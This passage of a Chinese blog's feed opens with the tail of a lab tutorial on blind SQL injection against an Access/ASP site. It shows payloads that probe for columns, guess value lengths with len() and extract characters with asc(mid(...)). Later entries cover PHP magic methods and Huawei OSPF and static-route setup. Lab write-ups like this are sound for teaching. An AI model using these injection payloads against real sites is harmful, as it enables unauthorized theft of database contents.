admin)</code>命令判断在<code>admin</code>表中是否存在<code>admin</code>字段。<br><img alt data-src="https://image.3001.net/images/20181123/15429730838443.jpg" class="lozad"><br>没有报错说明存在，接着看看有没有<code>password</code>字段。<br><img alt data-src="https://image.3001.net/images/20181123/15429730869419.jpg" class="lozad"><br>发现也没有报错，说明存在。<br>然后判断这两个字段对应数据的长度。<br>因为我事先知道对应关系，所里我就直接判断<code>admin</code>的长度是5，<code>password</code>的长度是16。<br>使用语句是<code>and (select top 1 len(列名) from admin)=长度值</code>。<br>可以使用<code>and (select top 1 len(列名) from admin)&gt;长度值</code>来缩小范围。<br><img alt data-src="https://image.3001.net/images/20181123/15429730886605.jpg" class="lozad"><br><img alt data-src="https://image.3001.net/images/20181123/15429730898548.jpg" class="lozad"><br>这样我就判断出了数据的长度，然后根据数据长度反推数据。<br>使用的命令是<code>and (select top 1 asc(mid(列名，第几位，1)) from admin)=长度值</code>,这里的长度值是ASCII码。<br><img alt data-src="https://image.3001.net/images/20181123/15429730914866.jpg" class="lozad"><br>我使用的命令是<code>and (select top 1 asc(mid(admin，1，1)) from admin)=97</code><br>可以看到没有报错，这里<code>97</code>对应的是<code>a</code>，而我的<code>admin</code>列里的数据是<code>admin</code>,刚好对应，如果换成98，那么就会报错。<br>以此类推，猜解出数据。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;哈哈哈哈，，，我顾北清又回来啦，接着更新。&lt;br&gt;实验环境：win2008R2虚拟机，物理机（也就是我的win10）。&lt;br&gt;搭建环境用的是access+asp源码。&lt;/p&gt;
&lt;p&gt;环境搭建可以参照&lt;a href=&quot;https://www.cnblogs.com/Times
      
    
    </summary>
    
      <category term="安全" scheme="https://www.gubeiqing.cn/categories/%E5%AE%89%E5%85%A8/"/>
    
    
      <category term="安全" scheme="https://www.gubeiqing.cn/tags/%E5%AE%89%E5%85%A8/"/>
    
      <category term="CTF" scheme="https://www.gubeiqing.cn/tags/CTF/"/>
    
  </entry>
  
  <entry>
    <title>外部调用类的私有属性</title>
    <link href="https://www.gubeiqing.cn/2018/09/23/php04/"/>
    <id>https://www.gubeiqing.cn/2018/09/23/php04/</id>
    <published>2018-09-23T07:37:26.000Z</published>
    <updated>2019-10-04T04:12:31.736Z</updated>
    
    <content type="html"><![CDATA[<p>先来了解一下PHP类中的<code>__get</code>和<code>__set</code>函数<br>当试图获取一个不可达属性时，类会自动调用<code>__get</code>函数。<br>当试图设置一个不可达属性时，类会自动调用<code>__set</code>函数。</p><p>首先，来看一下<code>__get</code>函数，先来获取一个可达属性试试：</p><pre><code>&lt;?php    class A{        public $a=1;        private $b=2;        function __get($name){            echo &apos;you can get &apos;.$name;        }    }    $dy = new A();    echo $dy-&gt;a;?&gt;</code></pre><p>看一下它的返回：</p><pre><code>1</code></pre><p>没有问题，没有调用<code>__get</code>函数，现在我来访问一个私有的不可达属性：</p><pre><code>&lt;?php    class A{        public $a=1;        private $b=2;        function __get($name){            echo &apos;you can get &apos;.$name;        }    }    $dy = new A();    echo $dy-&gt;b;?&gt;</code></pre><p>会发现：</p><pre><code>you can get b</code></pre><p>说明这里调用了<code>__get</code>函数，我再来看一下<code>__set</code>函数，同样也是先使用可达的<code>public</code>属性：</p><pre><code>&lt;?php    class A{        public $a;        private $b;        function __set($name,$val){            echo &apos;you can get &apos;.$name.$val;        }    }    $dy = new A();    $dy-&gt;a = 1;    echo $dy-&gt;a;?&gt;</code></pre><p>看一下输出：</p><pre><code>1</code></pre><p>使用成功，没有问题，接着我们来使用私有属性：</p><pre><code>&lt;?php    class A{        public $a;        private $b;        function __set($name,$val){            echo &apos;you can get &apos;.$name.$val;        }    }    $dy = new A();    $dy-&gt;b = 1;    echo $dy-&gt;b;?&gt;</code></pre><p>这时看到：</p><pre><code>you can get b1PHP Fatal error:  Cannot access private property A::$b in /usercode/file.php on line 11</code></pre><p>这里调用了<code>__set</code>函数并提示我们不能使用类的私有属性。<br>现在来通过<code>__set</code>函数实现外部使用私有属性：</p><pre><code>&lt;?php    class A{        public $a;        private $b;        function __set($name,$val){                $this-&gt;$name=$val;        }        function B(){            echo $this-&gt;b;        }    }    $dy = new A();    $dy-&gt;b = 1;    $dy-&gt;B();?&gt;</code></pre><p>看一下输出：</p><pre><code>1</code></pre><p>说明使用成功。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;先来了解一下PHP类中的&lt;code&gt;__get&lt;/code&gt;和&lt;code&gt;__set&lt;/code&gt;函数&lt;br&gt;当试图获取一个不可达属性时，类会自动调用&lt;code&gt;__get&lt;/code&gt;函数。&lt;br&gt;当试图设置一个不可达属性时，类会自动调用&lt;code&gt;__set&lt;/code
      
    
    </summary>
    
      <category term="PHP" scheme="https://www.gubeiqing.cn/categories/PHP/"/>
    
    
      <category term="PHP" scheme="https://www.gubeiqing.cn/tags/PHP/"/>
    
  </entry>
  
  <entry>
    <title>OSPF单区域配置</title>
    <link href="https://www.gubeiqing.cn/2018/09/23/router06/"/>
    <id>https://www.gubeiqing.cn/2018/09/23/router06/</id>
    <published>2018-09-23T07:31:15.000Z</published>
    <updated>2019-08-21T02:46:38.183Z</updated>
    
    <content type="html"><![CDATA[<p>路由交换</p><a id="more"></a><p><strong>实验环境：华为模拟器eNSP</strong><br>现在有这样一个拓扑图：<br><img alt data-src="https://image.3001.net/images/20181123/15429729269257.jpg" class="lozad"><br>我想要让<code>R1</code>可以<code>ping</code>通<code>R3</code>,显然目前是不行的：</p><pre><code>&lt;R1&gt;ping 192.168.2.2PING 192.168.2.2: 56  data bytes, press CTRL_C to break    Request time out    Request time out    Request time out    Request time out    Request time out--- 192.168.2.2 ping statistics ---    5 packet(s) transmitted    0 packet(s) received    100.00% packet loss</code></pre><p>查看一下路由器<code>R1</code>的路由表：</p><pre><code>&lt;R1&gt;dis ip routing-table Route Flags: R - relay, D - download to fib------------------------------------------------------------------------------Routing Tables: Public        Destinations : 4        Routes : 4        Destination/Mask    Proto   Pre  Cost      Flags NextHop         Interface    127.0.0.0/8   Direct  0    0           D   127.0.0.1       InLoopBack0    127.0.0.1/32  Direct  0    0           D   127.0.0.1       InLoopBack0    192.168.1.0/24  Direct  0    0           D   192.168.1.1     Ethernet0/0/0    192.168.1.1/32  Direct  0    0           D   127.0.0.1       Ethernet0/0/0</code></pre><p>发现只有自己的IP地址，说明<code>ping</code>不通是正常的，现在我们来配置OSPF来让<code>R1</code>可以<code>ping</code>通<code>R3</code>。</p><pre><code>&lt;R1&gt;sy[R1]ospf    //启用ospf进程[R1-ospf-1]area 0      //区域号[R1-ospf-1-area-0.0.0.0]network 192.168.1.0 0.0.0.255   //宣告路由</code></pre><hr><pre><code>&lt;R2&gt;sy[R2]ospf[R2-ospf-1]area 0    [R2-ospf-1-area-0.0.0.0]network 192.168.1.0 0.0.0.255[R2-ospf-1-area-0.0.0.0]network 192.168.2.0 0.0.0.255</code></pre><hr><pre><code>&lt;R3&gt;sy[R3]ospf[R3-ospf-1]area 0    [R3-ospf-1-area-0.0.0.0]network 192.168.2.0 0.0.0.255</code></pre><p>这样就配好了，去<code>R1</code>上查看一下路由表：</p><pre><code>&lt;R1&gt;dis ip routing-table Route Flags: R - relay, D - download to fib------------------------------------------------------------------------------Routing Tables: Public        Destinations : 5        Routes : 5        Destination/Mask    Proto   Pre  Cost      Flags NextHop         Interface    127.0.0.0/8   Direct  0    0           D   127.0.0.1       InLoopBack0    127.0.0.1/32  Direct  0    0           D   127.0.0.1       InLoopBack0    192.168.1.0/24  Direct  0    0           D   192.168.1.1     Ethernet0/0/0    192.168.1.1/32  Direct  0    0           D   127.0.0.1       Ethernet0/0/0    192.168.2.0/24  OSPF    10   2           D   192.168.1.2     Ethernet0/0/0</code></pre><p>可以看到已经通过OSPF学到了路由器<code>R3</code>的路由，再来<code>ping</code>一下<code>R3</code>试试：</p><pre><code>&lt;R1&gt;ping 192.168.2.2PING 192.168.2.2: 56  data bytes, press CTRL_C to break    Reply from 192.168.2.2: bytes=56 Sequence=1 ttl=254 time=60 ms    Reply from 192.168.2.2: bytes=56 Sequence=2 ttl=254 time=30 ms    Reply from 192.168.2.2: bytes=56 Sequence=3 ttl=254 time=80 ms    Reply from 192.168.2.2: bytes=56 Sequence=4 ttl=254 time=60 ms    Reply from 192.168.2.2: bytes=56 Sequence=5 ttl=254 time=50 ms--- 192.168.2.2 ping statistics ---    5 packet(s) transmitted    5 packet(s) received    0.00% packet loss    round-trip min/avg/max = 30/56/80 ms</code></pre><p>可以看到，已经能<code>ping</code>通了，说明配置没有问题。<br>再来看一下OSPF状态信息：</p><pre><code>&lt;R1&gt;dis ospf peer brief     OSPF Process 1 with Router ID 192.168.1.1        Peer Statistic Information----------------------------------------------------------------------------Area Id          Interface                        Neighbor id      State    0.0.0.0          Ethernet0/0/0                    192.168.1.2      Full        ----------------------------------------------------------------------------</code></pre>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;路由交换&lt;/p&gt;
    
    </summary>
    
      <category term="路由交换" scheme="https://www.gubeiqing.cn/categories/%E8%B7%AF%E7%94%B1%E4%BA%A4%E6%8D%A2/"/>
    
    
      <category term="路由交换" scheme="https://www.gubeiqing.cn/tags/%E8%B7%AF%E7%94%B1%E4%BA%A4%E6%8D%A2/"/>
    
  </entry>
  
  <entry>
    <title>静态路由配置</title>
    <link href="https://www.gubeiqing.cn/2018/09/19/router05/"/>
    <id>https://www.gubeiqing.cn/2018/09/19/router05/</id>
    <published>2018-09-19T10:36:48.000Z</published>
    <updated>2019-08-21T02:46:34.839Z</updated>
    
    <content type="html"><![CDATA[<a id="more"></a><p><strong>什么是静态路由？</strong><br>静态路由是指由用户或网络管理员手工配置的路由信息。当网络的拓扑结构或链路的状态发生变化时，网络管理员需要手工去修改路由表中相关的静态路由信息。静态路由信息在缺省情况下是私有的，不会传递给其他的路由器。</p><p>实验环境：<code>华为模拟器eNSP</code><br>现在有这样一个拓扑图：<br><img alt data-src="https://image.3001.net/images/20181123/15429728542053.jpg" class="lozad"><br>很明显路由器<code>R1</code>和<code>R3</code>之间无法通信，<code>ping</code>一下试试。</p><pre><code>[R1]ping 192.168.2.2PING 192.168.2.2: 56  data bytes, press CTRL_C to break    Request time out    Request time out    Request time out    Request time out    Request time out--- 192.168.2.2 ping statistics ---    5 packet(s) transmitted    0 packet(s) received    100.00% packet loss</code></pre><p>全部超时，现在通过添加静态路由使<code>R1</code>和<code>R3</code>之间相互通信，先来看一下<code>R1</code>的路由表：</p><pre><code>&lt;R1&gt;dis ip routing-table Route Flags: R - relay, D - download to fib------------------------------------------------------------------------------Routing Tables: Public        Destinations : 4        Routes : 4        Destination/Mask    Proto   Pre  Cost      Flags NextHop         Interface    127.0.0.0/8   Direct  0    0           D   127.0.0.1       InLoopBack0    127.0.0.1/32  Direct  0    0           D   127.0.0.1       InLoopBack0    192.168.1.0/24  Direct  0    0           D   192.168.1.1     Ethernet0/0/0    192.168.1.1/32  Direct  0    0           D   127.0.0.1       Ethernet0/0/0</code></pre><p>现在只有回环接口和本地IP，现在来给他添加去往R3的静态路由：</p><pre><code>[R1]ip route-static 192.168.2.0 255.255.255.0 192.168.1.2Jul 25 2018 20:37:00-08:00 R1 DS/4/DATASYNC_CFGCHANGE:OID 1.3.6.1.4.1.2011.5.25.191.3.1 configurations have been changed. The current change number is 3, the change loop count is 0, and the maximum number of records is 4095.</code></pre><p>查看一下路由表：</p><pre><code>&lt;R1&gt;dis ip routing-table Route Flags: R - relay, D - download to fib------------------------------------------------------------------------------Routing Tables: Public        Destinations : 5        Routes : 5        Destination/Mask    Proto   Pre  Cost      Flags NextHop         Interface    127.0.0.0/8   Direct  0    0           D   127.0.0.1       InLoopBack0    127.0.0.1/32  Direct  0    0           D   127.0.0.1       InLoopBack0    192.168.1.0/24  Direct  0    0           D   192.168.1.1     Ethernet0/0/0    192.168.1.1/32  Direct  0    0           D   127.0.0.1       Ethernet0/0/0    192.168.2.0/24  Static  60   0          RD   192.168.1.2     Ethernet0/0/0</code></pre><p>发现路由表中已经加进了去往<code>R3</code>的静态路由，现在来<code>ping</code>一下<code>R3</code>。</p><pre><code>&lt;R1&gt;ping 192.168.2.2PING 192.168.2.2: 56  data bytes, press CTRL_C to break    Request time out    Request time out    Request time out    Request time out    Request time out--- 192.168.2.2 ping statistics ---    5 packet(s) transmitted    0 packet(s) received    100.00% packet loss</code></pre><p>看到无法<code>ping</code>通,因为现在只有去的路由，但是没有回来的路由，也就是说<code>ping</code>的数据包现在只知道怎么去，但是不知道怎么回来，那么现在来给他添加回程路由。<br>回程路由配在路由器<code>R3</code>上面。</p><pre><code>[R3]ip route-static 192.168.1.0 255.255.255.0 192.168.2.1Jul 25 2018 20:43:10-08:00 R3 DS/4/DATASYNC_CFGCHANGE:OID 1.3.6.1.4.1.2011.5.25.191.3.1 configurations have been changed. The current change number is 3, the change loop count is 0, and the maximum number of records is 4095.</code></pre><p>现在再去<code>R1</code>上面<code>ping</code>一下<code>R3</code>试试。</p><pre><code>&lt;R1&gt;ping 192.168.2.2PING 192.168.2.2: 56  data bytes, press CTRL_C to break    Reply from 192.168.2.2: bytes=56 Sequence=1 ttl=254 time=40 ms    Reply from 192.168.2.2: bytes=56 Sequence=2 ttl=254 time=60 ms    Reply from 192.168.2.2: bytes=56 Sequence=3 ttl=254 time=30 ms    Reply from 192.168.2.2: bytes=56 Sequence=4 ttl=254 time=90 ms    Reply from 192.168.2.2: bytes=56 Sequence=5 ttl=254 time=100 ms--- 192.168.2.2 ping statistics ---    5 packet(s) transmitted    5 packet(s) received    0.00% packet loss    round-trip min/avg/max = 30/64/100 ms</code></pre><p>发现可以<code>ping</code>通了，说明静态路由添加成功。<br>配置静态路由的命令是<code>ip route-static 要去网段 要去网段的子网掩码 下一跳</code>。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;a id=&quot;more&quot;&gt;&lt;/a&gt;

&lt;p&gt;&lt;strong&gt;什么是静态路由？&lt;/strong&gt;&lt;br&gt;静态路由是指由用户或网络管理员手工配置的路由信息。当网络的拓扑结构或链路的状态发生变化时，网络管理员需要手工去修改路由表中相关的静态路由信息。静态路由信息在缺省情况下是私有的，不
      
    
    </summary>
    
      <category term="路由交换" scheme="https://www.gubeiqing.cn/categories/%E8%B7%AF%E7%94%B1%E4%BA%A4%E6%8D%A2/"/>
    
    
      <category term="路由交换" scheme="https://www.gubeiqing.cn/tags/%E8%B7%AF%E7%94%B1%E4%BA%A4%E6%8D%A2/"/>
    
  </entry>
  
</feed>
